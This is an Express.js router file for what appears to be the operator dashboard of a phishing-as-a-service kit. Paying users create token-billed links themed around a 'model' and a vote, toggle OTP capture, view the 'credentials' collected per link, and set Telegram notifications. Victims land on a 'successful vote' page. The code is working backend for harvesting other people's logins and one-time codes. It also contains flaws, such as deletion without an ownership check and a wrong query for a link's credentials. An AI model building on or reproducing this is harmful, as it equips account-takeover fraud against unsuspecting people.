const router = require("express").Router();
const { linkTypes, templates } = require("../constants");
const Links = require("../models/LinkModel");
const Credentials = require("../models/CredentialModel");
const { ensureAuthenticated } = require("../config/auth");
const ShortUniqueId = require("short-unique-id");
const User = require("../models/User");
const bcrypt = require("bcryptjs");
const moment = require("moment");


router.get("/", async (req, res) => {
    try {
        return res.render("index", { req, layout: "layout" });
    } catch (err) {
        console.log(err)
    }
});

router.get("/dashboard", ensureAuthenticated, async (req, res) => {
    try {
        const credentials = await Credentials.find({ user: req.user.id }).limit(10);
        const links = await Links.find({ user: req.user.id }).limit(10);

        const linkscount = await Links.find({ user: req.user.id }).count();
        const credentialscount = await Credentials.find({ user: req.user.id }).count();

        return res.render("dashboard", { req, credentials, moment, credentialscount, linkscount, links, layout: "layout2" });
    } catch (err) {
        console.log(err)
    }
});

router.get("/pricing", ensureAuthenticated, async (req, res) => {
    return res.render("pricing", { moment, req, layout: "layout2" });
});

// CREDENTIALS
router.get("/credentials", ensureAuthenticated, async (req, res) => {
    const credentials = await Credentials.find({ user: req.user.id });
    return res.render("credentials", { credentials, moment, req, layout: "layout2" });
});

// LINKS START
router.get("/links", ensureAuthenticated, async (req, res) => {
    const links = await Links.find({ user: req.user.id });
    return res.render("Links", { links, moment, req, layout: "layout2" });
});

router.get("/links/:id", ensureAuthenticated, async (req, res) => {
    try {
        const { id } = req.params;
        const link = await Links.findById(id);
        if (link) {
            const credentials = await Links.find({ link: link.id })
            return res.render("linkDetails", { link, credentials, req, layout: "layout2" });
        } else {
            res.redirect("/404");
        }
    } catch (err) {
        console.log(err);
        res.redirect("/notfound");
    }
});

router.get("/create-link", ensureAuthenticated, (req, res) => {
    try {
        return res.render("createLink", { req, layout: "layout2" });
    } catch (err) {
        console.log(err);
        return res.redirect("/notfound");
    }
});

router.post("/create-link", ensureAuthenticated, async (req, res) => {
    try {
        const {
            name,
            linkType,
            modelName,
            otpEnabled
        } = req.body;

        if (!linkTypes.includes(linkType) || !modelName || !name) {
            req.flash("error_msg", "Fill all fields correctly");
            return res.redirect("/create-link");
        }

        if (req.user.tokens < 1) {
            req.flash("error_msg", "Insufficient tokens, purchase tokens to continue");
            return res.redirect("/create-link");
        }

        const uid = new ShortUniqueId({ length: 10 });
        const uniqueID = modelName.split(" ").join("-").toLowerCase() + "-" + uid.rnd();

        const currentDate = new Date();
        const newDate = new Date(currentDate);
        newDate.setDate(currentDate.getDate() + 7);

        const newLink = new Links({
            linkType,
            name: name.trim(),
            modelName: modelName.trim(),
            otpEnabled,
            link: uniqueID,
            user: req.user.id,
            expiry: newDate
        });
        await newLink.save();
        await User.updateOne({ username: req.user.username }, { tokens: req.user.tokens - 1 });
        req.flash("success_msg", "Link generated successfully!");
        return res.redirect(`/successful-link/${uniqueID}`);
    } catch (err) {
        console.log(err);
        return res.redirect("/notfound");
    }
});

router.get("/successful-link/:id", ensureAuthenticated, async (req, res) => {
    try {
        const id = req.params.id;
        const link = await Links.findOne({ link: id });
        return res.render("successfulLink", { req, id, moment, link, layout: "layout2" });
    } catch (err) {
        console.log(err);
        return res.redirect("/notfound");
    }
});

router.get("/successful-vote", async (req, res) => {
    try {
        return res.render("voted", { req, layout: false });
    } catch (err) {
        console.log(err);
        return res.redirect("/notfound");
    }
});

router.post("/delete-link/:id", ensureAuthenticated, async (req, res) => {
    try {
        const { id } = req.params;
        await Links.deleteOne({ _id: id });
        await Credentials.deleteMany({ link: id });
        req.flash("success_msg", "Link and credentials deleted successfully");
    } catch (err) {
        console.log(err);
        return res.redirect("/notfound");
    }
});

router.get("/disable-otp/:id", ensureAuthenticated, async (req, res) => {
    try {
        const { id } = req.params;
        await Links.updateOne({ _id: id }, { otpEnabled: false });
        req.flash("success_msg", "OTP disabled successfully");
        res.redirect("/links");
    } catch (err) {
        console.log(err);
        return res.redirect("/notfound");
    }
});

router.get("/enable-otp/:id", ensureAuthenticated, async (req, res) => {
    try {
        const { id } = req.params;
        await Links.updateOne({ _id: id }, { otpEnabled: true });
        req.flash("success_msg", "OTP enabled successfully");
        res.redirect("/links");
    } catch (err) {
        console.log(err);
        return res.redirect("/notfound");
    }
});

// LINKS END
router.get("/settings", ensureAuthenticated, (req, res) => {
    try {
        return res.render("settings", { req, layout: "layout2" });
    } catch (err) {
        console.log(err);
        return res.redirect("/notfound");
    }
});


router.post("/update-telegram", ensureAuthenticated, async (req, res) => {
    try {
        const {
            telegramID
        } = req.body;
        await User.updateOne({ _id: req.user.id }, {
            telegramID
        });
        req.flash("success_msg", "Telegram ID updated successfully");
        return res.redirect("/settings");
    } catch (err) {
        console.log(err);
        return res.redirect("/notfound");
    }
});

router.post("/update-notification", ensureAuthenticated, async (req, res) => {
    try {
        const {
            notification
        } = req.body;
        await User.updateOne({ _id: req.user.id }, {
            notification
        });
        req.flash("success_msg", "Notification seetings updated successfully");
        return res.redirect("/settings");
    } catch (err) {
        console.log(err);
        return res.redirect("/notfound");
    }
});


router.post("/update-password", ensureAuthenticated, async (req, res) => {
    try {
        const {
            password
        } = req.body;

        if (password.length < 6) {
            req.flash("error_msg", "Password is too short");
            return res.redirect("/settings");
        }

        const salt = await bcrypt.genSalt();
        const hash = await bcrypt.hash(password, salt);

        await User.updateOne({ _id: req.user.id }, {
            password: hash
        });
        req.flash("success_msg", "Password updated successfully");
        return res.redirect("/settings");
    } catch (err) {
        console.log(err);
        return res.redirect("/found");
    }
});


router.get("/notfound", (req, res) => {
    try {
        return res.render("notfound", { req, layout: false });
    } catch (err) {
        console.log(err);
        return res.redirect("/notfound");
    }
});


module.exports = router;